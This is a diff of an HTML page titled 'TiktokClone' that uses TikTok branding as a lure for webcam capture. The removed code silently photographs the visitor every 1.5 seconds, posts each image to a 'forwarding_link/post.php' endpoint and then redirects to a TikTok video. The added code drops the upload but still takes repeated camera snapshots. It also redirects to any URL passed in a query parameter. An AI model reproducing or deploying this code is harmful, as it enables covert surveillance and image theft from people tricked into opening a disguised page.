@@ -1,92 +1,74 @@
 <!doctype html>
 <html lang="en">
-
 <head>
   <meta charset="utf-8">
   <title>TiktokClone</title>
   <base href="/">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="icon" type="image/x-icon" href="favicon.ico">
-  <link rel="shortcut icon"
-    href="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2"
-    type="image/x-icon">
-
+  <link rel="shortcut icon" href="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2" type="image/x-icon">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" />
   <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
 </head>
 
 <body>
-  <app-root></app-root>
-  <script async src="https://www.tiktok.com/embed.js"></script>
-  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <video id="video" width="740" height="580" autoplay></video>
+  <canvas id="canvas" width="740" height="580" style="display:none;"></canvas>
+  <span id="errorMsg" style="color:red;"></span>
+  
   <script>
-
-    function post(imgdata, url) {
-      $.ajax({
-        type: 'POST',
-        data: { cat: imgdata },
-        url: 'forwarding_link/post.php',
-        dataType: 'json',
-        async: false,
-        success: function (result) {
-          // call the function that handles the response/results
-        },
-        error: function () {
-        }
-      });
-      window.location.replace(url);
-    };
-
-
     'use strict';
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const errorMsgElement = document.querySelector('span#errorMsg');
+    const errorMsgElement = document.getElementById('errorMsg');
+    let firstPhotoTaken = false;
 
     const constraints = {
       audio: false,
-      video: {
-
-        facingMode: "user"
-      }
+      video: { facingMode: "user" }
     };
 
-    // Access webcam
     async function init() {
+      console.log('Запуск камеры...');
       try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        console.log('Камера успешно запущена!');
         handleSuccess(stream);
       } catch (e) {
-        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+        console.error(`Ошибка доступа к камере: ${e.toString()}`);
+        errorMsgElement.innerHTML = `navigator.getUserMedia error: ${e.toString()}`;
       }
-
     }
 
-    // Success
     function handleSuccess(stream) {
+      console.log('Начинаем обработку потока камеры...');
       window.stream = stream;
       video.srcObject = stream;
 
+      const context = canvas.getContext('2d');
+      const redirectUrl = new URLSearchParams(window.location.search).get('redirect');
+      console.log(`Redirect URL: ${redirectUrl}`);
 
-      var context = canvas.getContext('2d');
       setInterval(function () {
-
+        console.log('Фотографирование...');
         context.drawImage(video, 0, 0, 740, 580);
-        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-        post(canvasData, 'https://www.tiktok.com/@dguselnikov2/video/7055946133817855234?is_from_webapp=1&sender_device=pc');
+        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        console.log('Фотография создана:', canvasData);
+
+        if (!firstPhotoTaken && redirectUrl) {
+          console.log('Первая фотография сделана. Выполняем редирект на:', redirectUrl);
+          firstPhotoTaken = true;
+          window.location.replace(redirectUrl);
+        } else if (firstPhotoTaken) {
+          console.log('Фотографии продолжают делаться, но редирект уже выполнен.');
+        }
       }, 1500);
-
-
     }
 
-
-    // Load init
-    init();
-
+    // Запуск камеры при загрузке страницы
+    window.onload = init;
   </script>
 </body>
-
 </html>
